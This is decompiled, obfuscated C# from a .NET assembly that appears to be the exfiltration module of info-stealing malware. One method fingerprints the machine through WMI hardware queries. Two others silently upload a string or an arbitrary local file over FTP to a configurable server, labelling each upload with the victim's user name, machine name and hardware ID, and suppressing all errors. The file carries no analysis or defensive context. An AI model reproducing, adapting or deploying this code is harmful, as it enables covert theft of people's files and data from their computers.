using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GlIxuPPoosXGy;

internal sealed class TvsCtQOAQyGAc
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string JdZrlYhckFAAOw()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107404744));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404691)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107404706);
		ManagementObject val3 = new ManagementObject(getString_0(107404701) + text2 + getString_0(107404628));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107404623)).ToString();
		return text3 + text;
	}

	public static void rTwukiUzIroUsZI(string toUsNdWETP = "URL", string NpwIsaxHrXR = "USERNAME", string VyPgNvCYrrK = "ACCESO", string uDWGdJjCxtjVnpK = "")
	{
		try
		{
			string text = JdZrlYhckFAAOw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(toUsNdWETP + getString_0(107407975) + Environment.UserName + getString_0(107407962) + Environment.MachineName + getString_0(107407941) + text + getString_0(107407936));
			ftpWebRequest.Method = getString_0(107404598);
			ftpWebRequest.Credentials = new NetworkCredential(NpwIsaxHrXR, VyPgNvCYrrK);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(uDWGdJjCxtjVnpK);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void dSnpGcfDOUGHpZ(string xFmlNwaeFFpO = "URL", string TyGePsbEOSbvvV = "USERNAME", string ZjVedTiCgVzKT = "ACCESO", string rVCAQrLuQIeX = "")
	{
		try
		{
			string text = JdZrlYhckFAAOw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(xFmlNwaeFFpO + getString_0(107407975) + Environment.UserName + getString_0(107407962) + Environment.MachineName + getString_0(107407941) + text + getString_0(107407941) + Path.GetFileName(rVCAQrLuQIeX));
			ftpWebRequest.Method = getString_0(107404598);
			ftpWebRequest.Credentials = new NetworkCredential(TyGePsbEOSbvvV, ZjVedTiCgVzKT);
			byte[] array = File.ReadAllBytes(rVCAQrLuQIeX);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static TvsCtQOAQyGAc()
	{
		Strings.CreateGetStringDelegate(typeof(TvsCtQOAQyGAc));
	}
}
